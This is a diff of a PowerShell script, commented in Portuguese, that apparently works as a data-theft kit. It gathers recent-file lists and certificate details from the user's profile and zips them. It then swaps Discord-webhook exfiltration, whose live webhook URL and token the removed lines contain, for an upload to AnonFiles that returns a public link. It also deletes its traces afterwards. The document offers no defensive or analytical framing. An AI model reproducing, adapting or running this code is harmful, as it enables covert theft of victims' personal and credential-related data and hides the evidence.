@@ -1,5 +1,4 @@
-# KIT v3.1 – 8 MB max, PS 7.5.4, sem elevação
-$hook="https://discord.com/api/webhooks/1458595316336037923/LcenEw4uom3H_-llTphqVq0Rr2uLqyFwSAk3HJ7E1UCWoCEL-wJ1Qp4HDcHdlSH7vYkV"
+# KIT v3.2 – AnonFiles, 20 GB max, PS 7.5.4, sem elevação
 $kit="$env:TEMP\k"; ni -ItemType Directory $kit -Force |Out-Null
 
 # 1) TXT leves
@@ -26,55 +25,28 @@ Get-ChildItem $env:APPDATA\Microsoft\Windows\Recent -Name |Out-File $kit\rec.txt
 Get-ChildItem Cert:\CurrentUser\My|Select Subject,Thumbprint,NotAfter |Out-File $kit\certs.txt -Encoding UTF8
 
 # 4) ZIP
-Compress-Archive $kit "$kit.zip" -CompressionLevel Optimal
+Compress-Archive $kit "$env:TEMP\k.zip" -CompressionLevel Optimal
 
-# 5) Corta até 8 MB
-$max=8MB
-while((Get-Item "$kit.zip").Length -gt $max){
-  # remove o maior arquivo ainda presente
-  Get-ChildItem $kit -File |Sort Length -Desc|Select -First 1|Remove-Item -Force
-  Compress-Archive -Update -Path $kit -DestinationPath "$kit.zip" -CompressionLevel Optimal
-}
-
-# 6) Envia – suporta multiplos anexos se ainda exceder
-function Send-DiscordSmallFiles {
-  param($Files)
-  $uri="$hook?wait=true"
+# 5) Upload AnonFiles
+$file=Get-Item "$env:TEMP\k.zip"
+$uri="https://api.anonfiles.com/upload"
+try{
   $boundary=[System.Guid]::NewGuid().ToString()
   $lf="`r`n"
   $body=(
-    $Files |%{
-      "--$boundary$lf"+
-      "Content-Disposition: form-data; name=`"file$($Files.IndexOf($_))`"; filename=`"$($_.Name)`"$lf"+
-      "Content-Type: application/octet-stream$lf$lf"+
-      [System.IO.File]::ReadAllBytes($_.FullName) +
-      $lf
-    }
-  ) -join ''
-  $body+= "--$boundary--$lf"
+    "--$boundary$lf"+
+    "Content-Disposition: form-data; name=`"file`"; filename=`"$($file.Name)`"$lf"+
+    "Content-Type: application/octet-stream$lf$lf"+
+    [System.IO.File]::ReadAllBytes($file.FullName)+
+    "$lf--$boundary--$lf"
+  )
   $bytes=[System.Text.Encoding]::UTF8.GetBytes($body)
-  Invoke-RestMethod -Uri $uri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bytes
+  $resp=Invoke-RestMethod -Uri $uri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bytes
+  # devolve a URL pública
+  $resp.data.file.url.full
+}catch{
+  $_.Exception.Message
 }
 
-$zipItem=Get-Item "$kit.zip"
-if($zipItem.Length -le $max){
-  Send-DiscordSmallFiles @(,$zipItem)
-}else{
-  # Particiona em pedaços de 7 MB
-  $chunk=7MB
-  $reader=[System.IO.File]::OpenRead($zipItem.FullName)
-  $part=0
-  while($reader.Position -lt $reader.Length){
-    $buf=New-Object byte[] $chunk
-    $count=$reader.Read($buf,0,$buf.Length)
-    $path="$env:TEMP\k_part$part.zip"
-    [System.IO.File]::WriteAllBytes($path,$buf[0..($count-1)])
-    Send-DiscordSmallFiles (Get-Item $path)
-    Remove-Item $path -Force
-    $part++
-  }
-  $reader.Close()
-}
-
-# 7) Limpa
-Remove-Item $kit -Recurse -Force; Remove-Item "$kit.zip" -Force
+# 6) Limpa
+Remove-Item $kit -Recurse -Force; Remove-Item $file -Force
